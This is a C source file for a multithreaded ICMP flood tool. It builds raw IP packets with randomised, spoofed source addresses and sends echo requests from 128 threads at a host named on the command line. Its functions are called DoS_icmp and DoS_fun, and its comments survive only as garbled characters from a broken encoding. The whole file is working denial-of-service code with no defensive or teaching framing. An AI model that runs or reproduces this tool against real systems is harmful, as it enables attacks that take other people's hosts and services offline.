#include <stdio.h>
#include <ctype.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <errno.h>
#include <stdlib.h>
#include <time.h> 
#include <pthread.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netdb.h>
#include <string.h>
#include <stdlib.h>
#include <syslog.h>
#include <stdio.h>
#include <signal.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netdb.h>
#include <setjmp.h>
#include <errno.h>
#include <sys/time.h>

/* ����߳��� */
#define MAXCHILD 128
/* Ŀ��IP��ַ */
static unsigned long dest = 0;
/* ICMPЭ���ֵ */
static int PROTO_ICMP = -1;
/* ������־ */
static int alive = -1;
static int rawsock;
/* ���������������
*  ����ϵͳ�ĺ���Ϊα�������
*   �����ʼ���йأ����ÿ���ò�ֵͬ���г�ʼ��
*/

static inline ulong 
    myrandom (int begin, int end)
{
    int gap = end - begin +1;
    int ret = 0;
    /* ��ϵͳʱ���ʼ�� */
    srand((unsigned)time(0));
    /* ����һ������begin��end֮���ֵ */
    ret = random()%gap + begin;
    return ret;
}
 
static void DoS_icmp (void );
static void 
DoS_icmp (void )
{  
    struct sockaddr_in to;  
    struct ip *iph;  
    struct icmp *icmph;  
    char *packet;  
    ulong temp;
    int pktsize = sizeof (struct ip) + sizeof (struct icmp) + 64;  
    packet =(char *)malloc (pktsize);  
    iph = (struct ip *) packet;  
    icmph = (struct icmp *) (packet + sizeof (struct ip));  
    memset (packet, 0, pktsize);  
    /* IP�İ汾,IPv4 */
    iph->ip_v = 4;  
    /* IPͷ������,�ֽ��� */
    iph->ip_hl = 5;  
    /* �������� */
    iph->ip_tos = 0;  
    /* IP���ĵ��ܳ��� */
    iph->ip_len = htons (pktsize);  
    /* ��ʶ,����ΪPID */
    iph->ip_id = htons (getpid ());  
    /* �εı��˵�ַ */
    iph->ip_off = 0; 
    /* TTL */
    iph->ip_ttl = 0x0;  
    /* Э������ */
    iph->ip_p = PROTO_ICMP;  
    /* У���,����дΪ0 */
    iph->ip_sum = 0;  
    /* ���͵�Դ��ַ */
    temp = myrandom(0, 65535);
    iph->ip_src = *(struct in_addr *)&temp;      
    /* ����Ŀ���ַ */
    iph->ip_dst = *(struct in_addr*)&dest; 
    //Ϊʲô���������в��Ŀ�ĵ�ַӦ����һ�µİ�����
    //printf("dst ip: %s\n",  inet_ntoa(*(struct in_addr*)&dest));
    //printf("src ip : %s , dst ip: %s\n", inet_ntoa(iph->ip_src), inet_ntoa(iph->ip_dst));
    /* ICMP����Ϊ�������� */
    icmph->icmp_type = ICMP_ECHO;  
    /* ����Ϊ0 */
    icmph->icmp_code = 0;  
    /* �������ݲ���Ϊ0,���Ҵ���Ϊ0,ֱ�ӶԲ�Ϊ0��icmp_type���ּ��� */
    icmph->icmp_cksum = htons (~(ICMP_ECHO << 8));  
    /* ��д����Ŀ�ĵ�ַ���� */
    to.sin_family =  AF_INET;  
    to.sin_addr.s_addr = dest;
    to.sin_port = htons(0);
    /* �������� */
    int rc = sendto (rawsock, packet, pktsize, 0, (struct sockaddr *) &to, sizeof (struct sockaddr));  
    printf("return code : %d\n", rc);
    /* �ͷ��ڴ� */
    free (packet);
}

static void *
DoS_fun (void * ip)
{  
    while(alive)
    {
        DoS_icmp();
        //icmp();Ϊʲô��û�ж���ĺ�������������g++������ gcc����
    }
}
/* �źŴ�����,�����˳�����alive */
static void 
DoS_sig(int signo)
{
    alive = 0;
}

int main(int argc, char *argv[])
{
    struct hostent * host = NULL;
    struct protoent *protocol = NULL;
    char protoname[]= "icmp";
    int i = 0;
    pthread_t pthread[MAXCHILD];
    int err = -1;
    unsigned long  temp;
    alive = 1;
    /* ��ȡ�ź�CTRL+C */
    signal(SIGINT, DoS_sig);
    /* �����Ƿ�������ȷ */
    if(argc < 2)
    {
        printf("usage : \n");
        return -1;
    }
    /* ��ȡЭ������ICMP */
    protocol = getprotobyname(protoname);
    if (protocol == NULL)
    {
        perror("getprotobyname()");
        return -1;
    }
    PROTO_ICMP = protocol->p_proto;
    /* �����Ŀ�ĵ�ַΪ�ַ���IP��ַ */
    dest = inet_addr(argv[1]);
    if(dest == INADDR_NONE)
    {
        /* ΪDNS��ַ */
        host = gethostbyname(argv[1]);
        if(host == NULL)
        {
            perror("gethostbyname");
            return -1;
        }
        temp = inet_addr(host->h_addr);
        /* ����ַ������dest�� */
        memcpy((char *)&dest, &temp, host->h_length);
    }
    printf("dst ip: %s\n", inet_ntoa(*(struct in_addr*)&dest));
    sleep(1);
    printf("sleep over...\n");
    /* ����ԭʼsocket */
    rawsock = socket (AF_INET, SOCK_RAW, PROTO_ICMP);   
    if (rawsock < 0)       
        rawsock = socket (AF_INET, SOCK_RAW, PROTO_ICMP);   
    /* ����IPѡ�� */
    setsockopt (rawsock, SOL_IP, IP_HDRINCL, "1", sizeof ("1"));
    /* ��������߳�Эͬ���� */
    for(i=0; i<MAXCHILD; i++)
    {
        err = pthread_create(&pthread[i], NULL, DoS_fun, (void *)&i);
        printf("thread\n");
    }
 
    /* �ȴ��߳̽��� */
    for(i=0; i<MAXCHILD; i++)
    {   
        pthread_join(pthread[i], NULL);
    }
    printf("over \n");
    close(rawsock);
    return 0;
}

